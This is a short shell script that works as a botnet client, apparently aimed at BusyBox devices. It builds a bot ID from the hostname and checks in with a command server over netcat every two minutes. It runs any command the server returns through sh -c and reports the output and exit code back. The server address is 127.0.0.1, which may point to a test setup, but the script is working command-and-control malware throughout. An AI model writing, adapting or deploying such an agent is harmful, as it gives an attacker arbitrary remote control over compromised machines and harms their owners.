#!/bin/sh
ID=$(hostname | md5sum | cut -c1-16)
HOST=$(hostname)
while :; do
  MSG='{"bot_id":"'$ID'","hostname":"'$HOST'","ip":"","arch":"unknown","platform":"busybox"}'
  RESP=$(echo "$MSG" | nc 127.0.0.1 10001 -w 5 -q 2 2>/dev/null)
  if echo "$RESP" | grep -q '"type":"cmd"'; then
    CMD=$(echo "$RESP" | sed 's/.*"command":"\([^"]*\)".*/\1/')
    CMDID=$(echo "$RESP" | sed 's/.*"cmd_id":"\([^"]*\)".*/\1/')
    if [ -n "$CMD" ] && [ -n "$CMDID" ]; then
      OUTPUT=$(sh -c "$CMD" 2>&1)
      EC=$?
      OUTPUT_ESC=$(echo "$OUTPUT" | sed 's/"/\\"/g')
      echo '{"cmd_id":"'$CMDID'","output":"'$OUTPUT_ESC'","exit_code":'$EC'}' | nc 127.0.0.1 10001 -w 3 -q 1 2>/dev/null
    fi
  fi
  sleep 120
done
